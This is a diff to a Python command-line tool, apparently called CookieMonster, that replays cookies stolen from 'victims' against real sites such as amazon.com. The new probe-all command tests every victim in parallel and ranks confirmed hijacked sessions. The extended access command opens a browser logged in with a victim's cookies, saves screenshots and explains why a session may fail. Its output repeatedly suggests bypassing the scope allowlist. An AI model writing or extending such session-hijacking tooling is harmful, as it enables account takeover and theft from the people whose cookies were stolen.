@@ -197,11 +197,7 @@ def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
     detectados, replay no navegador e estado final (CONFIRMED/LIKELY/ANONYMOUS/UNKNOWN).
     """
     from .domain.matcher import applicable_cookies
-    from .validate.auth_state import (detect_baseline_vs_injected as detect_diff,
-                                    CONFIRMED, LIKELY, ANONYMOUS, UNKNOWN)
-    from .validate.scoring import score_artifacts
-    from .inject import httpx_client, playwright_client
-    from .inject.capture import sent_cookie_names
+    from .validate.auth_state import CONFIRMED, LIKELY, ANONYMOUS, UNKNOWN
     from .util import scope as scope_util
 
     store = _load_store(str(db_path))
@@ -214,7 +210,6 @@ def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
 
     target_url = url or f"{scheme}://{host}{req_path}"
 
-    # 1) Melhor vitima
     best = store.best_victims_for_domain(domain, limit=1)
     if not best:
         console.print(f"[red]Nenhuma vitima com cookies para {domain}[/]")
@@ -226,10 +221,9 @@ def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
                   f"auth={victim['auth']}  total={victim['total']}")
     console.print(f"    arquivo={victim['dir_name'][:64]}")
 
-    # 2) Cookies aplicaveis + artefatos auth
     raw = store.list_cookies(victim_id=victim["victim_id"], domain=domain, limit=100000)
     matched = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)
-    auth_arts = [c for c in matched if classify(c["name"]) == "auth"]
+    auth_arts = [c for c in matched if is_auth_name(c["name"])]
     console.print(f"\n[2] [cyan]ARTEFATOS DE AUTENTICACAO[/]")
     if auth_arts:
         for c in auth_arts[:10]:
@@ -240,43 +234,19 @@ def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
         console.print(f"    [yellow]Nenhum artefato auth classificado por nome[/yellow]")
     console.print(f"    [dim]{len(matched)} cookies aplicaveis no total[/dim]")
 
-    # 3) Replay (baseline sem cookies + injetado com cookies)
     console.print(f"\n[3] [cyan]REPLAY ({channel})[/]")
-    def replay(cookies_):
-        if channel == "httpx":
-            r = httpx_client.get(target_url, cookies_)
-            r.setdefault("sent_cookies", [])
-            r["sent_cookies"] = [{"headers": {"cookie": httpx_client.cookies_to_header(cookies_)}}]
-            return r
-        return playwright_client.replay(
-            target_url, cookies_, mode=replay_mode, max_wait_ms=max_wait_ms,
-        )
-
-    baseline = replay([])
-    injected = replay(matched)
-
-    if injected.get("error"):
-        console.print(f"    [red]erro: {injected['error'][:120]}[/red]")
-        baseline = {"status_code": None, "final_url": "", "text": "",
-                    "evidence": {}, "sent_cookies": []}
-        injected = {"status_code": None, "final_url": "", "text": "",
-                    "evidence": {}, "sent_cookies": [], "cookie_jar": []}
+    res = _probe_one(store, victim["victim_id"], domain, scheme, req_path, target_url,
+                    channel, replay_mode, max_wait_ms)
+    if res.get("error"):
+        console.print(f"    [red]erro: {res['error'][:120]}[/red]")
     else:
-        console.print(f"    URL final: [cyan]{injected.get('final_url', '?')[:100]}[/cyan]")
+        console.print(f"    URL final: [cyan]{res.get('final_url', '?')[:100]}[/cyan]")
         if channel == "playwright":
-            sent_names = set(injected.get("cookie_jar") or [])
-            console.print(f"    Cookies enviados ao alvo: [green]{len(sent_names)}[/green]")
+            console.print(f"    Cookies enviados ao alvo: [green]{res['cookie_jar_count']}[/green]")
 
-    # 4) Validacao
     console.print(f"\n[4] [cyan]VALIDACAO[/]")
-    if baseline.get("evidence") and injected.get("evidence"):
-        result = detect_diff(baseline["evidence"], injected["evidence"], domain=host)
-    else:
-        from .validate.auth_state import detect_from_summary
-        result = detect_from_summary(baseline, injected, host)
-
-    state = result["state"]
-    conf = result.get("confidence", 0)
+    state = res["state"]
+    conf = res["confidence"]
     color = {"CONFIRMED": "green", "LIKELY": "cyan", "ANONYMOUS": "red",
              "UNKNOWN": "yellow"}.get(state, "yellow")
     state_pt = {
@@ -284,6 +254,7 @@ def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
         "LIKELY": "ACESSO PROVAVEL",
         "ANONYMOUS": "ACESSO REJEITADO",
         "UNKNOWN": "INDETERMINADO",
+        "NO_COOKIES": "SEM COOKIES",
     }
     console.print(f"    >>> ESTADO: [bold {color}]{state}[/] ([bold]{state_pt.get(state, state)}[/])")
     console.print(f"    >>> Confianca: [bold]{conf:.2f}[/]")
@@ -293,11 +264,12 @@ def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
         console.print(f"    [green]>>> Identidade diferencial detectada. Acesso provavel.[/green]")
     elif state == LIKELY:
         console.print(f"    [cyan]>>> UI autenticada diferencial, sem identidade explicita.[/cyan]")
+    elif state == "NO_COOKIES":
+        console.print(f"    [yellow]>>> Nenhum cookie aplicavel para a URL.[/yellow]")
     else:
         console.print(f"    [yellow]>>> Evidencia insuficiente. Investigue manualmente.[/yellow]")
 
-    # Sinais diferenciais (resumo)
-    diff = result.get("differential") or {}
+    diff = (res.get("result") or {}).get("differential") or {}
     if diff:
         bits = []
         for k, v in diff.items():
@@ -307,8 +279,8 @@ def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
                 bits.append(f"{k}={v}")
         console.print(f"    [dim]diferencial: {' | '.join(bits[:5])}")
 
-    # Persistir run
     from .report import json_out
+    result = res.get("result") or {}
     evidence_blob = json_out.dumps({
         "state": state, "confidence": conf,
         "differential": result.get("differential", {}),
@@ -317,7 +289,203 @@ def probe(db_path: Path, domain: str, scheme: str, req_path: str, url,
     })
     run_id = store.record_run(victim["victim_id"], target_url, host, channel,
                               state=state, confidence=conf, evidence_json=evidence_blob)
-    console.print(f"\n[dim]run_id={run_id} salvo em runs[/dim]")
+    console.print(f"[dim]run_id={run_id} salvo em runs[/dim]")
+
+
+# ---- Fase A2: probe-all -- todas as vitimas do dominio em paralelo ----
+
+@cli.command()
+@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
+              show_default=True)
+@click.option("--domain", required=True, help="Dominio alvo (ex.: amazon.com)")
+@click.option("--limit", type=int, default=0, show_default=True,
+              help="Limitar a N melhores vitimas (0 = todas)")
+@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
+              default="playwright", show_default=True)
+@click.option("--workers", type=int, default=3, show_default=True,
+              help="Workers paralelos (Playwright pesado: max 4)")
+@click.option("--max-wait-ms", type=int, default=6000, show_default=True)
+@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
+              default="strict", show_default=True)
+@click.option("--allow-unsafe-scope", is_flag=True,
+              help="Desativa o guardrail de escopo.")
+def probe_all(db_path: Path, domain: str, limit: int, channel: str,
+              workers: int, max_wait_ms: int, replay_mode: str,
+              allow_unsafe_scope: bool):
+    """Executa probe em TODAS as vitimas do dominio (em paralelo).
+
+    Saida amigavel mostrando resumo por estado, ultimos runs e destaque
+    de acessos confirmados com comando para replicar.
+
+    Para grandes datasets, combine --limit N (top N vitimas por auth) com
+    --channel httpx (probe rapido, ~1s/vitima) para triagem.
+    """
+    import time
+    from collections import Counter
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    from .util import scope as scope_util
+
+    store = _load_store(str(db_path))
+    host = domain.split("://")[-1].strip("/")
+    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
+        console.print("[red]Recusado: alvo fora da allowlist. Use --allow-unsafe-scope.[/]")
+        return
+
+    target_url = f"https://{host}/"
+    best = store.best_victims_for_domain(domain, limit=limit if limit > 0 else 100000)
+    if not best:
+        console.print(f"[red]Nenhuma vitima com cookies para {domain}[/]")
+        return
+    victims = best
+    console.print(f"[bold bright_white]=== CookieMonster: probe-all {domain} ===[/]")
+    console.print(f"  Total de vitimas candidatas: [yellow]{len(victims)}[/yellow]")
+    console.print(f"  Canal: {channel}  Workers: {workers}  Replay-mode: {replay_mode}")
+    console.print(f"  (inicando paralelo, isso pode levar minutos...)\n")
+
+    start = time.time()
+    results = []
+
+    def run_for(target):
+        vid = target["victim_id"]
+        try:
+            r = _probe_one(store, vid, domain, "https", "/", target_url,
+                           channel, replay_mode, max_wait_ms)
+            r["victim_id"] = vid
+            r["auth"] = target.get("auth", 0)
+            r["total"] = target.get("total", 0)
+            return r
+        except Exception as exc:
+            return {"victim_id": vid, "state": "ERROR", "error": str(exc)}
+
+    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
+        futs = [pool.submit(run_for, v) for v in victims]
+        for i, fut in enumerate(as_completed(futs), 1):
+            r = fut.result()
+            results.append(r)
+            elapsed = time.time() - start
+            avg = elapsed / i
+            eta = max(0, avg * (len(victims) - i))
+            tag = r.get("state", "?")
+            color = {"CONFIRMED": "green", "LIKELY": "cyan",
+                     "ANONYMOUS": "red", "UNKNOWN": "yellow",
+                     "NO_COOKIES": "dim", "ERROR": "red"}.get(tag, "dim")
+            console.print(
+                f"[{i}/{len(victims)}] {elapsed:5.0f}s (eta {eta:4.0f}s) "
+                f"vid=[yellow]{r['victim_id']:>5}[/] "
+                f"state=[{color}]{tag:9}[/] auth={r.get('auth', 0)}",
+                highlight=False)
+
+    # Sumario por estado
+    elapsed = time.time() - start
+    by_state = Counter(r.get("state", "?") for r in results)
+    console.print(f"\n[bold]Resumo ({elapsed:.0f}s, {len(results)} vitimas)[/bold]")
+    for state in ("CONFIRMED", "LIKELY", "ANONYMOUS", "UNKNOWN", "NO_COOKIES", "ERROR"):
+        n = by_state.get(state, 0)
+        if n:
+            pt = {"CONFIRMED": "acesso confirmado",
+                  "LIKELY": "acesso provavel",
+                  "ANONYMOUS": "rejeitado",
+                  "UNKNOWN": "indeterminado",
+                  "NO_COOKIES": "sem cookies",
+                  "ERROR": "erro"}.get(state, state)
+            color = {"CONFIRMED": "green", "LIKELY": "cyan",
+                     "ANONYMOUS": "red", "UNKNOWN": "yellow",
+                     "ERROR": "red"}.get(state, "dim")
+            console.print(f"  [{color}]{state:9}[/] ({pt}): {n}")
+
+    # Tabela compacta das vitimas
+    console.print(f"\n[bold]Detalhes (top 30)[/bold]")
+    console.print(f"  {'VID':>5}  {'STATE':>9}  {'CONF':>5}  {'AUTH':>4}  {'TOTAL':>5}  {'FINAL_URL':<60}")
+    sorted_r = sorted(results, key=lambda r: (
+        {"CONFIRMED": 0, "LIKELY": 1}.get(r["state"], 2),
+        -float(r.get("confidence", 0) or 0)
+    ))
+    for r in sorted_r[:30]:
+        url = r.get("final_url") or "(sem replay)"
+        if len(url) > 58:
+            url = url[:58] + ".."
+        console.print(f"  {r['victim_id']:>5}  {r.get('state', '?'):>9}  "
+                      f"{r.get('confidence', 0):5.2f}  {r.get('auth', 0):>4}  "
+                      f"{r.get('total', 0):>5}  {url}")
+    if len(results) > 30:
+        console.print(f"  [dim]...+ {len(results) - 30} mais[/dim]")
+
+    # Destaque CONFIRMED/LIKELY: comandos para replicar acesso
+    confirmed = [r for r in results if r.get("state") == "CONFIRMED"]
+    likely = [r for r in results if r.get("state") == "LIKELY"]
+    if confirmed or likely:
+        top = (confirmed + likely)[:3]
+        console.print(f"\n[bold green]>>> Alvos com acesso (CONFIRMED/LIKELY):[/]")
+        for r in top:
+            console.print(f"  - [cyan]{domain}[/] vitima={r['victim_id']} state={r['state']} conf={r.get('confidence', 0):.2f}")
+        if top:
+            v = top[0]
+            console.print(f"\n  [dim]Replicar acesso:[/dim]")
+            console.print(f"  [dim]  python -m cookiemonster access --domain {domain} --victim {v['victim_id']} --allow-unsafe-scope[/dim]")
+            console.print(f"  [dim]Exportar cookies:[/dim]")
+            console.print(f"  [dim]  python -m cookiemonster export-cookies --domain {domain} --victim {v['victim_id']} -o {domain}_cookies.txt[/dim]")
+    else:
+        console.print(f"\n[bold yellow]>>> Nenhum acesso confirmado neste dominio.[/]")
+        console.print(f"  [dim]Tente com outro dominio do scope ou outro canal.[/dim]")
+
+
+def _probe_one(store, victim_id, domain, scheme, req_path, target_url,
+               channel, replay_mode, max_wait_ms):
+    """Faz replay + detect para UMA vitima. Retorna (state, conf, result, error).
+
+    Usado por `probe` e `probe-all`.
+    """
+    from .domain.matcher import applicable_cookies
+    from .validate.auth_state import (detect_baseline_vs_injected,
+                                    detect_from_summary, CONFIRMED)
+
+    host = domain.split("://")[-1].strip("/")
+    raw = store.list_cookies(victim_id=victim_id, domain=domain, limit=100000)
+    matched = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)
+
+    if not matched:
+        return {"state": "NO_COOKIES", "confidence": 0, "result": {},
+                "error": "no_applicable_cookies"}
+
+    from .inject import httpx_client, playwright_client
+
+    def replay(cookies_):
+        if channel == "httpx":
+            r = httpx_client.get(target_url, cookies_)
+            r["sent_cookies"] = [{"headers": {"cookie": httpx_client.cookies_to_header(cookies_)}}]
+            return r
+        return playwright_client.replay(target_url, cookies_, mode=replay_mode,
+                                        max_wait_ms=max_wait_ms)
+
+    baseline = replay([])
+    injected = replay(matched)
+
+    if injected.get("error"):
+        baseline = {"status_code": None, "final_url": "", "text": "",
+                    "evidence": {}, "sent_cookies": []}
+        injected = {"status_code": None, "final_url": "", "text": "",
+                    "evidence": {}, "sent_cookies": [], "cookie_jar": []}
+
+    if baseline.get("evidence") and injected.get("evidence"):
+        result = detect_baseline_vs_injected(baseline["evidence"],
+                                            injected["evidence"], domain=host)
+    else:
+        result = detect_from_summary(baseline, injected, host)
+    return {
+        "state": result["state"],
+        "confidence": result.get("confidence", 0),
+        "result": result,
+        "final_url": injected.get("final_url", ""),
+        "cookie_jar_count": len(injected.get("cookie_jar") or []),
+        "auth_count": sum(1 for c in matched if is_auth_name(c["name"])),
+        "applied_count": len(matched),
+        "error": injected.get("error"),
+    }
+
+
+def is_auth_name(name: str) -> bool:
+    from .domain.selection import is_auth_candidate
+    return is_auth_candidate(name)
 
 
 # ---- Fase B: access -- abrir navegador e deixar o usuario interagir ----
@@ -384,34 +552,71 @@ def access(db_path: Path, domain: str, victim: int, url: str,
     console.print(f"  URL alvo: {target_url}")
     console.print(f"\n[cyan]Abrindo navegador (headed)...[/cyan]")
 
-    # Reuso do client existente para montar cookies
     from .inject import playwright_client
     pw_cookies = playwright_client._to_playwright_cookies(cookies)
+
+    from pathlib import Path as _P
+    screenshot_path = _P("evidence") / f"access_{host}_{victim}.png"
+    screenshot_path.parent.mkdir(exist_ok=True)
+
+    final_url_seen = [target_url]
+    login_signals = ["login", "signin", "sign-in", "log-in", "/auth/",
+                     "account/auth", "openid"]
 
     with sync_playwright() as p:
         browser = p.chromium.launch(headless=False, args=["--no-sandbox"])
         ctx_opts = context_options(mode=replay_mode)
         context = browser.new_context(**ctx_opts)
         try:
+            added = 0
+            failed = 0
             for c in pw_cookies:
                 try:
                     context.add_cookies([c])
+                    added += 1
                 except Exception:
-                    pass
+                    failed += 1
 
             page = context.new_page()
+            page.on("framenavigated", lambda f: final_url_seen.__setitem__(0, f.url))
             try:
                 page.goto(target_url, wait_until="domcontentloaded", timeout=30000)
             except Exception as exc:
                 console.print(f"[yellow]aviso: goto falhou: {exc}[/yellow]")
 
-            page.wait_for_timeout(max_wait_ms // 4)
+            page.wait_for_timeout(max_wait_ms)
 
-            jar = context.cookies(target_url)
+            try:
+                page.screenshot(path=str(screenshot_path), full_page=False)
+            except Exception:
+                pass
+
+            jar = context.cookies()
+            jar_target = context.cookies(target_url)
+            final_url = page.url
+            final_path = final_url.split("//", 1)[-1]
+            is_login = any(s in final_path.lower() for s in login_signals)
+
             console.print(f"\n[cyan]NAVEGADOR ABERTO[/cyan]")
-            console.print(f"  URL atual: [yellow]{page.url}[/yellow]")
+            console.print(f"  URL inicial: [dim]{target_url}[/dim]")
+            console.print(f"  URL final:   [yellow]{final_url}[/yellow]")
             console.print(f"  Titulo: {page.title()}")
-            console.print(f"  Cookies no browser: {len(jar)}")
+            console.print(f"  Cookies adicionados: [green]{added}[/green] (falhas: {failed})")
+            console.print(f"  Cookies no contexto total: {len(jar)}")
+            console.print(f"  Cookies no dominio alvo:  {len(jar_target)}")
+            console.print(f"  Screenshot salvo em: [dim]{screenshot_path}[/dim]")
+
+            if is_login:
+                console.print(f"\n[bold red]>>> A URL final parece uma pagina de LOGIN.[/bold red]")
+                console.print(f"    Possiveis causas:")
+                console.print(f"      - Cookies expirados/invalidados pelo servidor")
+                console.print(f"      - Sessao invalidada por outro dispositivo da vitima")
+                console.print(f"      - Cloudflare/anti-bot bloqueou o replay")
+                console.print(f"      - Captura muito antiga")
+                console.print(f"    Tente outra vitima com probe mais recente (CONFIRMED).")
+            else:
+                console.print(f"\n[bold green]>>> A URL final NAO parece login — a sessao pode ter sido aceita.[/bold green]")
+                console.print(f"    Se voce nao esta logado, verifique o screenshot.")
 
             if wait_enter:
                 console.print(f"\n[bold cyan]>>> Pressione ENTER no terminal para fechar o navegador <<<[/bold cyan]")
@@ -420,8 +625,8 @@ def access(db_path: Path, domain: str, victim: int, url: str,
                 except EOFError:
                     pass
             else:
-                console.print(f"  (fechando automaticamente apos {max_wait_ms // 4}ms)...")
-                page.wait_for_timeout(max_wait_ms // 4)
+                console.print(f"  (fechando automaticamente apos {max_wait_ms}ms)...")
+                page.wait_for_timeout(max_wait_ms)
         finally:
             try:
                 context.close()
@@ -431,7 +636,7 @@ def access(db_path: Path, domain: str, victim: int, url: str,
                 browser.close()
             except Exception:
                 pass
-    console.print(f"[dim]Navegador fechado.[/dim]")
+    console.print(f"[dim]Navegador fechado. Screenshot em: {screenshot_path}[/dim]")
 
 
 # ---- Fase C: export -- gera cookie jar pronto para uso ----
@@ -612,6 +817,7 @@ def dashboard(db_path: Path, limit: int):
     else:
         console.print(f"[bold yellow]>>> NENHUM ACESSO CONFIRMADO nos runs existentes.[/]")
         console.print(f"  [dim]Dica: rode probe/playwright em mais alvos para confirmar.[/dim]")
+        console.print(f"  [dim]  python -m cookiemonster probe-all --domain <alvo> --channel httpx --allow-unsafe-scope[/dim]")
 
 
 def classify(name: str) -> str:
